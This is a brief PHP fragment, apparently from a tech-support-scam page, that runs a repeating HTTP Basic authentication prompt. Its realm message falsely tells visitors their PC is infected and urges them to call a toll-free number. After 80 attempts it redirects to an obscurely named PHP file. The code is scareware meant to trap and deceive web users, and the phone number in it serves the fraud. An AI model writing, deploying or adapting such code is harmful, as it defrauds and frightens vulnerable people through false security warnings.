<?php
    ...
    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {
        ...
        if($_SESSION['login_attempts'] == 80){
            header('Location: XAfsdhfgdshfsd44M.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="Suspicious movement distinguished on your IP address because of destructive infection introduced in your PC. Call Toll Free now @ +1-888-938-8966 for any help."');
